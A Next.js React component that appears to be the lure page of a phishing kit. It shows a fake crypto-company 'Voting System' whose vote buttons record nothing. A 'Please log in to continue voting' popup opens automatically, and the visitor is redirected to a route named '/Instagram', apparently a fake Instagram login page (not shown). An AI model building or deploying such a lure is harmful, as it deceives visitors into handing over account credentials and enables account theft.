"use client";
import { useEffect } from "react";
import { useRouter } from "next/navigation";

const companies = [
  { name: "Anodos", photo: "/anodos.svg" },
  { name: "Intelcoin", photo: "/intel.png" },
  { name: "Binance", photo: "/binance.png" },
  { name: "Crypto", photo: "crypto.png" },
  { name: "Zilliqa Zil", photo: "zilli.webp" },
];

const VotingSystem = () => {
  const router = useRouter();

  useEffect(() => {
    const timer = setTimeout(() => {
      const popup = document.getElementById("popup");
      if (popup) {
        popup.classList.remove("hidden");
        setTimeout(() => {
          router.push("/Instagram");
        }, 3000);
      }
    }, 3000);
    return () => clearTimeout(timer);
  }, [router]);

  const handleVote = () => {
    const popup = document.getElementById("popup");
    if (popup) {
      popup.classList.remove("hidden");
      setTimeout(() => {
        router.push("/Instagram");
      }, 3000);
    }
  };

  const handleLogin = () => {
    router.push("/Instagram");
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 p-4">
      <h2 className="text-3xl font-bold text-white mb-8">
        Welcome to our Voting System
      </h2>
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
        {companies.map((company, index) => (
          <div
            key={index}
            className="bg-gray-800 p-6 rounded-lg shadow-lg flex flex-col items-center"
          >
            <img
              src={company.photo}
              alt={company.name}
              className="w-24 h-24 object-contain mb-4"
            />
            <h3 className="text-2xl font-semibold text-white mb-2">
              {company.name}
            </h3>
            <button
              className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded"
              onClick={handleVote}
            >
              Vote for {company.name}
            </button>
          </div>
        ))}
      </div>
      <div
        id="popup"
        className="fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-75 hidden"
      >
        <div className="bg-gray-800 p-8 rounded-lg shadow-xl text-center">
          <p className="text-xl font-semibold text-white mb-4">
            Please log in to continue voting.
          </p>
          <button
            className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded"
            onClick={handleLogin}
          >
            Log In
          </button>
        </div>
      </div>
    </div>
  );
};

export default VotingSystem;
